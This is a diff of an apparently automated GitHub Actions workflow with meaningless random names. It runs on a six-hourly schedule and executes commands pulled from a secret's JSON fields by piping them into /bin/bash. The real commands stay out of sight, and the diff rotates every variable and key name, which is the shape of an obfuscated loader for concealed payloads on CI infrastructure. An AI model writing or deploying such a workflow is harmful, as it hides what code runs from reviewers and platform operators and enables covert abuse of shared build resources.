@@ -2,21 +2,22 @@ name: ghyiuhru
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 1/6 * * *'
-jobs:  # 17865
+    - cron: '25 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: ghyiuhru
         env:
-          a71721: ${{ secrets.a71721 }}
+          rtt18555: ${{ secrets.rtt18555 }}
         run: |
-          echo $a71721 | jq -r .be92488 | /bin/bash
-          echo $x31 | jq -r .zhyv15 | /bin/bash
-          echo $d06 | jq -r .l995 | /bin/bash
-          echo $jd765 | jq -r .ecbk4566 | /bin/bash
-          echo $lnpck4441 | jq -r .fhg8839 | /bin/bash
-          echo $sspl43541 | jq -r .yfqx46 | /bin/bash
-          echo $egw4575 | jq -r .usp97 | /bin/bash
+          echo $rtt18555 | jq -r .xxmqy44 | /bin/bash
+          echo $zk760 | jq -r .i71 | /bin/bash
+          echo $ltt223 | jq -r .iuio48679 | /bin/bash
+          echo $v62671 | jq -r .fbwvn192 | /bin/bash
+          echo $b7 | jq -r .qjdo04 | /bin/bash
+          echo $ou0873 | jq -r .subgw2103 | /bin/bash
+          echo $vrzs8186 | jq -r .vtadv1 | /bin/bash
 
